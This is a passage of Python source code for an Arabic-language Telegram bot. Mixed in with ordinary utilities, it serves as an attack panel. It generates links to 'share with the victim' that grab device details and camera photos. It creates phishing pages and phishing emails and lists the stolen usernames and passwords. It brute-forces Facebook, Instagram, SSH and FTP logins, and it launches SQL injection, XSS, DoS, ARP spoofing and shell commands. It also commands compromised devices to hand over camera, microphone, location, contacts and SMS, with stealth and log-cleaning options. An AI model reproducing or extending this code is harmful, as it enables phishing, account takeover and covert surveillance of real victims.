        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_permission_user"
        safe_send(chat_id, "أدخل معرف المستخدم (chat_id) الذي تريد منحه صلاحية استخدام أدوات التجميع، أو اكتب 'list' لعرض المستخدمين الحاليين")
        return

    # ===== قفل الدردشة =====
    if data == "lock_chat":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_lock_chat"
        safe_send(chat_id, "أدخل معرف المستخدم (chat_id) الذي تريد قفل دردشته أو فتحها")
        return

    # ===== إرسال للمستخدم =====
    if data == "send_to_user":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_send_to_user"
        safe_send(chat_id, "أدخل البيانات بالصيغة: user_id|الرسالة")
        return

    # ===== نشاط المستخدمين =====
    if data == "user_activity":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT chat_id, action, timestamp FROM user_activity ORDER BY timestamp DESC LIMIT 20")
        rows = c.fetchall()
        conn.close()
        if rows:
            msg = "آخر نشاطات المستخدمين:\n"
            for r in rows:
                msg += f"- المستخدم {r[0]}: {r[1]} ( {r[2][:16]} )\n"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, "لا توجد نشاطات")
        return

    # ===== أزرار التجميع =====
    if data == "device_info":
        if not user_can_use_collector(chat_id):
            safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الأداة. يرجى التواصل مع المطور")
            return
        token = get_user_token(chat_id)
        link = f"{SERVER_URL}/device_info?token={token}"
        safe_send(chat_id, f"رابط جمع معلومات الجهاز\n\nشارك هذا الرابط مع الضحية، وعند فتحه سيتم جمع معلومات جهازه وإرسالها إليك تلقائياً:\n{link}\n\n(الرابط لا يحتوي على أي معلومات عنك)")
        return

    if data == "camera_hack":
        if not user_can_use_collector(chat_id):
            safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الأداة. يرجى التواصل مع المطور")
            return
        token = get_user_token(chat_id)
        link = f"{SERVER_URL}/camera_hack?token={token}"
        safe_send(chat_id, f"رابط اختراق الكاميرا الأمامية\n\nشارك هذا الرابط مع الضحية، وعند فتحه سيتم طلب إذن الكاميرا والتقاط صورة وإرسالها إليك:\n{link}\n\n(الرابط لا يحتوي على أي معلومات عنك)")
        return

    # ===== فحص الرابط =====
    if data == "check_link_advanced":
        user_states[chat_id] = "waiting_link_check_advanced"
        safe_send(chat_id, "أرسل الرابط لفحصه (تكلفة الفحص 5 نقاط)")
        return

    # ===== باقي الأزرار =====
    if data == "weather":
        user_states[chat_id] = "waiting_weather"
        safe_send(chat_id, "أدخل اسم المدينة (مثال: القاهرة، الرياض، دبي)")
        return
    if data == "wikipedia":
        user_states[chat_id] = "waiting_wikipedia"
        safe_send(chat_id, "أدخل مصطلح البحث في ويكيبيديا")
        return
    if data == "password_gen":
        user_states[chat_id] = "waiting_password_gen"
        safe_send(chat_id, "أدخل طول كلمة السر (عدد صحيح بين 8 و 32)")
        return
    if data == "password_strength":
        user_states[chat_id] = "waiting_password_strength"
        safe_send(chat_id, "أرسل كلمة السر لفحص قوتها")
        return
    if data == "text_to_speech":
        user_states[chat_id] = "waiting_tts"
        safe_send(chat_id, "أرسل النص لتحويله إلى صوت (باللغة العربية)")
        return
    if data == "translate":
        user_states[chat_id] = "waiting_translate"
        safe_send(chat_id, "أرسل النص للترجمة (سيتم ترجمته إلى العربية افتراضياً، يمكنك تحديد لغة أخرى)")
        return
    if data == "reminder":
        user_states[chat_id] = "waiting_reminder"
        safe_send(chat_id, "أدخل التذكير بالصيغة: الرسالة|الساعة:الدقيقة (مثال: اجتماع الساعة 3|15:30)")
        return
    if data == "news":
        user_states[chat_id] = "waiting_news"
        safe_send(chat_id, "أدخل موضوع الأخبار (مثال: سياسة، اقتصاد، رياضة)")
        return

    # ===== PDF =====
    if data == "pdf_menu":
        safe_send(chat_id, "اختر خدمة PDF:", reply_markup=build_pdf_menu())
        return
    if data == "pdf_summary":
        user_states[chat_id] = "waiting_pdf_summary"
        safe_send(chat_id, "أرسل ملف PDF لتلخيصه")
        return
    if data == "pdf_extract":
        user_states[chat_id] = "waiting_pdf_extract"
        safe_send(chat_id, "أرسل ملف PDF لاستخراج نصوصه")
        return
    if data == "pdf_smart":
        user_states[chat_id] = "waiting_pdf_smart"
        safe_send(chat_id, "أرسل ملف PDF للتحليل الذكي (ستتمكن من طرح أسئلة عليه)")
        return

    # ===== نقاط وإحالات =====
    if data == "my_points":
        points = get_user_points(chat_id)
        safe_send(chat_id, f"نقاطك: {points}")
        return
    if data == "my_referral":
        code = get_referral_code(chat_id)
        bot_username = bot.get_me().username
        link = f"https://t.me/{bot_username}?start=ref_{code}"
        safe_send(chat_id, f"رابط دعوتك:\n{link}\n\nكل من يسجل عبر رابطك يحصل على 10 نقاط لك وللمدعو")
        return
    if data == "points_history":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 20", (chat_id,))
        rows = c.fetchall()
        conn.close()
        if rows:
            msg = "سجل النقاط:\n"
            for row in rows:
                sign = "+" if row[0] > 0 else ""
                msg += f"{sign}{row[0]} - {row[1]} ( {row[2][:16]} )\n"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, "لا يوجد سجل للنقاط")
        return

    # ===== تحليل APK =====
    if data == "analyze_apk":
        user_states[chat_id] = "waiting_apk_analysis"
        safe_send(chat_id, "أرسل ملف APK لتحليله")
        return

    # ===== لوحة التحكم =====
    if data == "admin_panel":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        safe_send(chat_id, "لوحة التحكم:", reply_markup=build_admin_panel())
        return
    if data == "admin_stats":
        if not is_admin(chat_id):
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        users = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM targets")
        targets = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM scan_results")
        scans = c.fetchone()[0]
        conn.close()
        safe_send(chat_id, f"الإحصائيات:\nالمستخدمون: {users}\nالأجهزة: {targets}\nالفحوصات: {scans}")
        return
    if data == "admin_broadcast":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_broadcast"
        safe_send(chat_id, "أدخل رسالة البث")
        return
    if data == "admin_users":
        if not is_admin(chat_id):
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT chat_id, is_admin, is_banned, points, can_use_collector FROM users")
        rows = c.fetchall()
        conn.close()
        msg = "المستخدمون:\n"
        for r in rows:
            collector = "نعم" if r[4] else "لا"
            msg += f"{r[0]} - {'مدير' if r[1] else 'عادي'} - {'محظور' if r[2] else 'نشط'} - نقاط: {r[3]} - تجميع: {collector}\n"
        safe_send(chat_id, msg)
        return
    if data == "admin_reports":
        if not is_admin(chat_id):
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT target, scan_type, created_at FROM scan_results ORDER BY created_at DESC LIMIT 10")
        rows = c.fetchall()
        conn.close()
        if rows:
            msg = "آخر التقارير:\n"
            for row in rows:
                msg += f"{row[0]} - {row[1]} - {row[2][:16]}\n"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, "لا توجد تقارير")
        return
    if data == "admin_points":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_admin_points"
        safe_send(chat_id, "أدخل بالصيغة: user_id|amount|سبب (مثال: 123456|50|مكافأة)")
        return
    if data == "admin_ban":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_admin_ban"
        safe_send(chat_id, "أدخل user_id لحظر أو فك الحظر (مثال: 123456)")
        return
    if data == "admin_phishing_logs":
        if not is_admin(chat_id):
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT platform, username, password, ip, created_at FROM phishing_logs ORDER BY created_at DESC LIMIT 20")
        rows = c.fetchall()
        conn.close()
        if rows:
            msg = "سجل بيانات التصيد:\n"
            for r in rows:
                msg += f"المنصة: {r[0]}, المستخدم: {r[1]}, كلمة السر: {r[2]}, IP: {r[3]}, الوقت: {r[4][:16]}\n"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, "لا توجد بيانات تصيد")
        return

    # ===== قائمة القرصنة (للمطور فقط) =====
    if data == "hacking_menu":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        safe_send(chat_id, "القائمة السرية:", reply_markup=build_hacking_menu())
        return
    if data == "toggle_stealth":
        if not is_admin(chat_id):
            return
        global STEALTH_MODE
        STEALTH_MODE = not STEALTH_MODE
        safe_send(chat_id, f"وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}")
        return

    # ===== قائمة الحماية =====
    if data == "protection_menu":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        safe_send(chat_id, "قائمة الحماية:", reply_markup=build_protection_menu())
        return
    if data == "protect_lock":
        if not is_admin(chat_id):
            return
        global BOT_LOCKED
        BOT_LOCKED = not BOT_LOCKED
        safe_send(chat_id, f"قفل البوت: {'مفعل' if BOT_LOCKED else 'معطل'}")
        return
    if data == "protect_shield":
        if not is_admin(chat_id):
            return
        safe_send(chat_id, f"درع الحماية:\n{active_shield()}")
        return
    if data == "protect_stealth":
        if not is_admin(chat_id):
            return
        STEALTH_MODE = True
        change_bot_identity()
        safe_send(chat_id, "وضع التخفي الشامل: تم تفعيل التخفي (تغيير الهوية، الوكيل، User-Agent)")
        return
    if data == "protect_detect":
        if not is_admin(chat_id):
            return
        result = detect_intrusion()
        safe_send(chat_id, f"كشف الاختراق:\n{result}")
        return
    if data == "protect_identity":
        if not is_admin(chat_id):
            return
        result = change_bot_identity()
        safe_send(chat_id, f"تغيير الهوية:\n{result}")
        return
    if data == "protect_clean":
        if not is_admin(chat_id):
            return
        result = clean_traces()
        safe_send(chat_id, f"تنظيف السجلات:\n{result}")
        return
    if data == "protect_api":
        if not is_admin(chat_id):
            return
        safe_send(chat_id, f"تم تفعيل حماية API. مفتاح API: `{API_KEY}`\nاستخدمه في Header: X-API-Key")
        return
    if data == "protect_backup":
        if not is_admin(chat_id):
            return
        result = backup_data()
        safe_send(chat_id, f"النسخ الاحتياطي:\n{result}")
        return
    if data == "protect_reboot":
        if not is_admin(chat_id):
            return
        result = restart_bot_safely()
        safe_send(chat_id, f"إعادة التشغيل الآمن:\n{result}")
        return

    # ===== أزرار التصيد =====
    if data == "phishing_pages":
        safe_send(chat_id, "اختر المنصة لإنشاء صفحة تصيد:", reply_markup=build_phishing_pages_menu())
        return
    if data.startswith("phish_"):
        platform = data.split("_")[1]
        page_url = f"{SERVER_URL}/phishing_pages/{platform}"
        safe_send(chat_id, f"تم إنشاء صفحة تصيد لـ {platform}\nالرابط: {page_url}\nشارك هذا الرابط مع الضحية")
        return
    if data == "phishing_email":
        user_states[chat_id] = "waiting_phishing_email"
        safe_send(chat_id, "أدخل بيانات البريد التصيدي بالصيغة:\nالبريد_الهدف|الموضوع|النص\nمثال: victim@example.com|تنبيه أمني|يرجى تحديث كلمة السر الخاصة بك")
        return

    # ===== الأزرار الأساسية الأخرى (للمطور فقط) =====
    if data == "bruteforce_fb":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_fb_username"
        safe_send(chat_id, "أدخل بريد أو رقم أو اسم مستخدم فيسبوك")
        return
    if data == "bruteforce_ig":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_ig_username"
        safe_send(chat_id, "أدخل اسم مستخدم انستغرام")
        return
    if data == "bruteforce_ssh":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_ssh_target"
        safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
        return
    if data == "bruteforce_ftp":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_ftp_target"
        safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
        return
    if data == "bruteforce_custom":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_custom_bruteforce"
        safe_send(chat_id, "أدخل البيانات بالصيغة: هدف|نوع(facebook/instagram/ssh/ftp)|كلمات_سر مفصولة بفاصلة")
        return
    if data == "download_video":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_download"
        safe_send(chat_id, "أدخل رابط الفيديو (يوتيوب، فيسبوك، تيك توك)")
        return
    if data == "port_scan":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_portscan"
        safe_send(chat_id, "أدخل الهدف (IP أو نطاق)")
        return
    if data == "ssl_scan":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_ssl"
        safe_send(chat_id, "أدخل النطاق لفحص SSL")
        return
    if data == "list_devices":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT device_id, name, status, last_seen FROM targets")
        rows = c.fetchall()
        conn.close()
        if rows:
            msg = "الأجهزة المسجلة:\n"
            for row in rows:
                msg += f"جهاز: {row[1]}, الحالة: {row[2]}, آخر ظهور: {row[3][:16]}\n"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, "لا توجد أجهزة")
        return
    if data == "hack_sqli":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_sqli_hack"
        safe_send(chat_id, "أدخل رابط الموقع لاختبار حقن SQL")
        return
    if data == "hack_xss":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_xss_hack"
        safe_send(chat_id, "أدخل رابط الموقع لاختبار XSS")
        return
    if data == "hack_dos":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_dos"
        safe_send(chat_id, "أدخل الهدف بالصيغة: IP|المنفذ|المدة(ثانية)")
        return
    if data == "hack_arp":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_arp"
        safe_send(chat_id, "أدخل بالصيغة: IP_الهدف|IP_البوابة")
        return
    if data == "hack_shell":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        user_states[chat_id] = "waiting_shell"
        safe_send(chat_id, "أدخل أمر Shell")
        return
    if data == "hack_camera":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز. استخدم الأجهزة أولاً")
            return
        add_command(device_id, "CAPTURE_CAMERA")
        safe_send(chat_id, f"تم إرسال أمر الكاميرا للجهاز {device_id}")
        return
    if data == "hack_mic":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز")
            return
        user_states[chat_id] = "waiting_mic_duration"
        safe_send(chat_id, "أدخل مدة التسجيل بالثواني")
        return
    if data == "hack_location":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز")
            return
        add_command(device_id, "GET_LOCATION")
        safe_send(chat_id, f"تم إرسال أمر الموقع للجهاز {device_id}")
        return
    if data == "hack_contacts":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز")
            return
        add_command(device_id, "GET_CONTACTS")
        safe_send(chat_id, f"تم إرسال أمر جهات الاتصال للجهاز {device_id}")
        return
    if data == "hack_sms":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز")
            return
        add_command(device_id, "GET_SMS")
        safe_send(chat_id, f"تم إرسال أمر SMS للجهاز {device_id}")
        return
    if data == "hack_screenshot":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز")
            return
        add_command(device_id, "SCREENSHOT")
        safe_send(chat_id, f"تم إرسال أمر لقطة الشاشة للجهاز {device_id}")
        return
    if data == "hack_shutdown":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز")
            return
        add_command(device_id, "SHUTDOWN")
        safe_send(chat_id, f"تم إرسال أمر إيقاف التشغيل للجهاز {device_id}")
        return

# ===================== معالجات النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    chat_id = message.chat.id
    text = message.text.strip()
    state = user_states.get(chat_id)

    update_last_seen(chat_id)
    log_activity(chat_id, f"text: {text[:50]}")

    if BOT_LOCKED and not is_admin(chat_id):
        safe_send(chat_id, "البوت مقفل حالياً. يرجى التواصل مع المطور")
        return

    # ===== إدارة الصلاحيات =====
    if state == "waiting_permission_user":
        if not is_admin(chat_id):
            return
        if text.lower() == 'list':
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id, can_use_collector FROM users")
            rows = c.fetchall()
            conn.close()
            msg = "المستخدمون وصلاحية التجميع:\n"
            for r in rows:
                msg += f"{r[0]} - {'نعم' if r[1] else 'لا'}\n"
            safe_send(chat_id, msg)
        else:
            try:
                target_user = int(text.strip())
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("SELECT can_use_collector FROM users WHERE chat_id = ?", (target_user,))
                row = c.fetchone()
                if row:
                    new_status = 0 if row[0] else 1
                    c.execute("UPDATE users SET can_use_collector = ? WHERE chat_id = ?", (new_status, target_user))
                    if new_status:
                        conn2 = sqlite3.connect(DB_PATH)
                        c2 = conn2.cursor()
                        c2.execute("INSERT OR IGNORE INTO user_tokens (chat_id, token) VALUES (?, ?)", (target_user, secrets.token_urlsafe(16)))
                        conn2.commit()
                        conn2.close()
                    conn.commit()
                    conn.close()
                    safe_send(chat_id, f"تم {'منح' if new_status else 'إلغاء'} صلاحية التجميع للمستخدم {target_user}")
                else:
                    safe_send(chat_id, f"المستخدم {target_user} غير موجود")
            except:
                safe_send(chat_id, "معرف غير صحيح")
        user_states[chat_id] = None
        return

    # ===== قفل الدردشة =====
    if state == "waiting_lock_chat":
        if not is_admin(chat_id):
            return
        try:
            target_user = int(text.strip())
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            row = c.fetchone()
            if row:
                new_status = 0 if row[0] else 1
                c.execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                conn.commit()
                conn.close()
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'قفل'} الدردشة مع المستخدم {target_user}")
            else:
                safe_send(chat_id, f"المستخدم {target_user} غير موجود")
        except:
            safe_send(chat_id, "معرف غير صحيح")
        user_states[chat_id] = None
        return

    # ===== إرسال للمستخدم =====
    if state == "waiting_send_to_user":
        if not is_admin(chat_id):
            return
        parts = text.split('|')
        if len(parts) >= 2:
            try:
                target_user = int(parts[0].strip())
                msg_text = parts[1].strip()
                safe_send(target_user, msg_text)
                safe_send(chat_id, f"تم إرسال الرسالة إلى {target_user}")
            except:
                safe_send(chat_id, "معرف غير صحيح")
        else:
            safe_send(chat_id, "صيغة غير صحيحة. استخدم: user_id|الرسالة")
        user_states[chat_id] = None
        return

    # ===== خدمة /start =====
    if text.startswith('/start'):
        user_name = message.from_user.first_name or "صديق"
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT created_at, last_seen FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        is_new = False
        if not row:
            c.execute("INSERT INTO users (chat_id, created_at, last_seen) VALUES (?, ?, ?)", 
                     (chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
            conn.commit()
            is_new = True
        else:
            last_seen = row[1]
            if last_seen:
                diff = (datetime.now() - datetime.fromisoformat(last_seen)).days
                if diff >= 2:
                    safe_send(chat_id, f"انظر من عاد لطلب المساعدة بعد غياب {diff} يوم 😐")
            c.execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))
            conn.commit()
        conn.close()

        if 'ref_' in text:
            code = text.split('ref_')[1].strip()
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id FROM users WHERE referral_code = ?", (code,))
            row = c.fetchone()
            if row and row[0] != chat_id:
                add_points(row[0], 10, "دعوة مستخدم جديد")
                add_points(chat_id, 10, "مكافأة التسجيل عبر الدعوة")
                safe_send(row[0], "تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط")
                safe_send(chat_id, "تم منحك 10 نقاط مكافأة التسجيل!")
            conn.close()

        get_user_token(chat_id)
        
        # صورة ترحيبية
        if is_new:
            img_path = create_welcome_image(user_name)
            if img_path:
                with open(img_path, 'rb') as f:
                    bot.send_photo(chat_id, f, caption=f"مرحباً {user_name}! أنا هنا لمساعدتك")
                os.remove(img_path)
            else:
                safe_send(chat_id, f"مرحباً {user_name}! أنا هنا لمساعدتك")
        else:
            safe_send(chat_id, f"مرحباً بعودتك {user_name}!")
        
        safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))
        return

    # ===== الخدمات العامة =====
    if state == "waiting_weather":
        result = get_weather(text)
        safe_send(chat_id, f"حالة الطقس:\n{result}")
        user_states[chat_id] = None
        return
    if state == "waiting_wikipedia":
        result = wikipedia_search(text)
        safe_send(chat_id, f"نتيجة البحث:\n{result}")
        user_states[chat_id] = None
        return
    if state == "waiting_password_gen":
        try:
            length = int(text)
            if length < 8 or length > 32:
                safe_send(chat_id, "الطول يجب أن يكون بين 8 و 32")
            else:
                password = password_generator(length)
                safe_send(chat_id, f"كلمة السر المولدة:\n{password}")
        except:
            safe_send(chat_id, "يرجى إدخال رقم صحيح")
        user_states[chat_id] = None
        return
    if state == "waiting_password_strength":
        strength, crack_time, score = password_strength(text)
        safe_send(chat_id, f"تحليل كلمة السر:\nالقوة: {strength}\nوقت الاختراق المتوقع: {crack_time}\nالدرجة: {score}/6")
        user_states[chat_id] = None
        return
    if state == "waiting_tts":
        filepath = text_to_speech(text)
        if filepath and os.path.exists(filepath):
            with open(filepath, 'rb') as f:
                bot.send_audio(chat_id, f)
            os.remove(filepath)
        else:
            safe_send(chat_id, "فشل تحويل النص إلى صوت")
        user_states[chat_id] = None
        return
    if state == "waiting_translate":
        safe_send(chat_id, "أدخل اللغة المستهدفة (ar, en, fr, de, es) أو اتركها فارغة للترجمة إلى العربية")
        user_states[chat_id] = "waiting_translate_lang"
        user_states[f"{chat_id}_translate_text"] = text
        return
    if state == "waiting_translate_lang":
        target_lang = text.lower() if text else 'ar'
        original_text = user_states.get(f"{chat_id}_translate_text", "")
        chunks, source_lang = translate_text_advanced(original_text, target_lang)
        msg = f"النص الأصلي ({source_lang}):\n{original_text}\n\nالترجمة ({target_lang}):\n"
        for chunk in chunks:
            msg += chunk + "\n"
        safe_send(chat_id, msg)
        user_states[chat_id] = None
        if f"{chat_id}_translate_text" in user_states:
            del user_states[f"{chat_id}_translate_text"]
        return
    if state == "waiting_reminder":
        parts = text.split('|')
        if len(parts) >= 2:
            msg_text = parts[0].strip()
            time_str = parts[1].strip()
            try:
                hour, minute = map(int, time_str.split(':'))
                now = datetime.now()
                target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                if target_time <= now:
                    target_time += timedelta(days=1)
                delay = (target_time - now).total_seconds()
                def send_reminder():
                    safe_send(chat_id, f"تذكير:\n{msg_text}")
                timer = threading.Timer(delay, send_reminder)
                timer.daemon = True
                timer.start()
                reminder_timers[chat_id] = timer
                safe_send(chat_id, f"تم تعيين التذكير لـ {time_str}")
            except:
                safe_send(chat_id, "وقت غير صحيح")
        else:
            safe_send(chat_id, "صيغة غير صحيحة")
        user_states[chat_id] = None
        return
    if state == "waiting_news":
        result = get_news(text)
        safe_send(chat_id, result)
        user_states[chat_id] = None
        return

    # ===== فحص الرابط =====
    if state == "waiting_link_check_advanced":
        safe_send(chat_id, "جاري فحص الرابط... قد يستغرق بضع ثوانٍ")
        result = check_link_safety_advanced(text, chat_id)
        if isinstance(result, str):
            safe_send(chat_id, result)
        else:
            report = format_link_report(result)
            safe_send(chat_id, report)
        user_states[chat_id] = None
        return

    # ===== بريد تصيد =====
    if state == "waiting_phishing_email":
        if not is_admin(chat_id):
            safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
            return
        parts = text.split('|')
        if len(parts) >= 3:
            target_email = parts[0].strip()
            subject = parts[1].strip()
            message = parts[2].strip()
            platform = random.choice(['facebook', 'instagram', 'tiktok', 'twitter'])
            phishing_link = f"{SERVER_URL}/phishing_pages/{platform}"
            result = send_phishing_email(target_email, subject, message, phishing_link)
            if result is True:
                safe_send(chat_id, f"تم إرسال بريد التصيد إلى {target_email} بنجاح")
            else:
                safe_send(chat_id, f"فشل إرسال البريد: {result}")
        else:
            safe_send(chat_id, "صيغة غير صحيحة")
        user_states[chat_id] = None
        return

    # ===== باقي الأوامر الأساسية (للمطور فقط) =====
    if state == "waiting_broadcast":
        if not is_admin(chat_id):
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT chat_id FROM users")
        users = c.fetchall()
        conn.close()
        sent = 0
        for user in users:
            try:
                bot.send_message(user[0], f"رسالة من الإدارة:\n{text}")
                sent += 1
                time.sleep(0.05)
            except:
                pass
        safe_send(chat_id, f"تم إرسال الرسالة لـ {sent} مستخدم")
        user_states[chat_id] = None
        return

    if state == "waiting_admin_points":
        if not is_admin(chat_id):
            return
        parts = text.split('|')
        if len(parts) >= 3:
            try:
                target_user = int(parts[0].strip())
                amount = int(parts[1].strip())
                reason = parts[2].strip()
                add_points(target_user, amount, reason)
                safe_send(chat_id, f"تم إضافة {amount} نقطة للمستخدم {target_user} بسبب: {reason}")
            except:
                safe_send(chat_id, "صيغة غير صحيحة. استخدم: user_id|amount|سبب")
        else:
            safe_send(chat_id, "صيغة غير صحيحة. استخدم: user_id|amount|سبب")
        user_states[chat_id] = None
        return

    if state == "waiting_admin_ban":
        if not is_admin(chat_id):
            return
        try:
            target_user = int(text.strip())
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            row = c.fetchone()
            if row:
                new_status = 0 if row[0] else 1
                c.execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                conn.commit()
                conn.close()
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'حظر'} المستخدم {target_user}")
            else:
                safe_send(chat_id, f"المستخدم {target_user} غير موجود")
        except:
            safe_send(chat_id, "معرف غير صحيح")
        user_states[chat_id] = None
        return

    # ===== الأوامر الأساسية الأخرى =====
    if state == "waiting_fb_username":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_fb_password_list"
        user_states[f"{chat_id}_fb_user"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو اكتب 'default' لاستخدام القائمة الافتراضية")
        return
    if state == "waiting_fb_password_list":
        if not is_admin(chat_id):
            return
        username = user_states.get(f"{chat_id}_fb_user")
        if text.lower() == 'default':
            passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
        else:
            passwords = [p.strip() for p in text.split(',')]
        safe_send(chat_id, f"جاري تخمين كلمة سر فيسبوك لـ {username} ... قد يستغرق بعض الوقت")
        result = brute_force_facebook(username, passwords, max_attempts=len(passwords))
        if result['success']:
            safe_send(chat_id, f"تم العثور على كلمة السر: {result['credentials']['password']}")
        else:
            safe_send(chat_id, f"فشل التخمين. تم تجربة {result['attempts']} كلمة سر")
        user_states[chat_id] = None
        return

    if state == "waiting_ig_username":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_ig_password_list"
        user_states[f"{chat_id}_ig_user"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو اكتب 'default'")
        return
    if state == "waiting_ig_password_list":
        if not is_admin(chat_id):
            return
        username = user_states.get(f"{chat_id}_ig_user")
